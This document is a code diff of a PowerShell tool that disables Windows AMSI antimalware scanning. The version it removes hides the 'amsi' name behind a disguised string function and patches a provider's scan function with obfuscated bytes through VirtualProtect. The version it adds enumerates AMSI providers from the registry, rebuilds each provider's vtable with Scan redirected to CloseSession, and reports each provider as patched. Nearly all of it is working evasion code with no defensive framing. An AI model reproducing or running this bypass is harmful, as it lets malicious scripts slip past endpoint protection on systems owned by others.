@@ -16,12 +16,6 @@ public class Kernel32 {
 	
 	[DllImport("kernel32")]
 	public static extern IntPtr GetModuleHandleA(string name);
-	
-	[DllImport("kernel32")]
-	public static extern int GetLastError();
-	
-	[DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
 
@@ -53,14 +47,6 @@ public delegate int CreateInstanceDelegate(
     out IntPtr ppvObject
 );
 "@
-
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-[UnmanagedFunctionPointer(CallingConvention.StdCall)]
-public delegate int CloseDelegate(IntPtr thisPtr, ulong value);
-"@
-
 
 
 #------------------------RUNTIME
@@ -119,46 +105,47 @@ function run {
 	}
 
 	#---------------------------------CREATE CLOSE and DISPLAY delegates
-
 	# Read vtable pointer of the object
 	$objVTable = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($pObj)
+	
+	$vtable_len = 30 #how many functions should be overrided?
+	
+	$closeSessionPtr= [System.Runtime.InteropServices.Marshal]::ReadIntPtr($objVTable, 4 * [IntPtr]::Size)
+	
+	#recreate vtable
+	$new_vtable = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vtable_len * [IntPtr]::Size);
+	for($i = 0; $i -lt $vtable_len; $i++) {
+		try {
+			$fnPtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($objVTable, $i * [IntPtr]::Size)
+			[System.Runtime.InteropServices.Marshal]::WriteIntPtr($new_vtable, $i * [IntPtr]::Size, $fnPtr)
+		}
+		catch {
+			write-warning "Invalid memory read"
+			break;
+		}
+	}
+	
+	#override Scan with CloseSession
+	[System.Runtime.InteropServices.Marshal]::WriteIntPtr($new_vtable, 3 * [IntPtr]::Size, $closeSessionPtr)
+	
+	#overrride vtable ptr
+	[System.Runtime.InteropServices.Marshal]::WriteIntPtr($pObj, 0, $new_vtable)
 
-	$closePtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($objVTable, 3 * [IntPtr]::Size)
-	$closeDel = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-		$closePtr,
-		[Type][CloseDelegate]
-	)
-
-	$p = 0
-	$arr = '01@ab'.tochararray()
-	$nop = [byte]($arr[0])*3
-	$b = [byte]($arr[1])
-	$e = [byte]($arr[2])*3
-	$f = [byte]($arr[3])
-	$g = [byte]($arr[4])
-	[kernel32]::VirtualProtect($closePtr, [uint32]4, [byte]($arr[2]), [ref]$p)
-	[System.Runtime.InteropServices.Marshal]::Copy([Byte[]] ($b, $e, ($g+$f), $nop), 0, $closePtr, 4)
 }
 
 #------------------------CONSTANTS
-
-function Cannonicalize-User([string]$in) {
-	$user = $in
-	$user = $user.replace('er','ma')
-	$user = $user.ToCharArray()
-	[Array]::Reverse($user)
-
-	$user[3] = [char]($user[3]-12)
-	$user -join ""
-}
-$user = Cannonicalize-User 'user'
-
-$l_names = (Get-Item 'HKLM:\SOFTWARE\Microsoft\').opensubkey($user).opensubkey('providers').getsubkeynames() | foreach { (split-path ((Get-Item ("HKLM:\SOFTWARE\classes\clsid\{0}" -f $_)).opensubkey(("in{1}server{0}" -f [byte]" "[0], "proc")).GetValue('').Trim('"')) -leaf) } 
+$amsi = (Get-Item 'HKLM:\SOFTWARE\Microsoft\').getsubkeynames() | where {$_.endswith('SI')}
+$providers = $(Get-Item 'HKLM:\SOFTWARE\Microsoft\').opensubkey($amsi).getsubkeynames()[0]
+$l_names = (Get-Item 'HKLM:\SOFTWARE\Microsoft\').opensubkey($amsi).opensubkey($providers).getsubkeynames() | foreach { (split-path ((Get-Item ("HKLM:\SOFTWARE\classes\clsid\{0}" -f $_)).opensubkey(("in{1}server{0}" -f [byte]" "[0], "proc")).GetValue('').Trim('"')) -leaf) } 
 $l_names = @($l_names)
-
-$l_guids = (Get-Item 'HKLM:\SOFTWARE\Microsoft\').opensubkey($user).opensubkey('providers').getsubkeynames()
+$l_guids = (Get-Item 'HKLM:\SOFTWARE\Microsoft\').opensubkey($amsi).opensubkey($providers).getsubkeynames()
 for($i = 0; $i -lt $l_names.Count; $i++) { 
-	Run -clsid $l_guids[$i] -name $l_names[$i]
+	$res = Run -clsid $l_guids[$i] -name $l_names[$i]
+	if ($res -eq $false) {
+		write-warning ("Failed to patch {0}" -f $l_names[$i])
+	} else {
+		write-output ("{0} succesfully patched" -f $l_names[$i])
+	}
 }
 "@
 ```
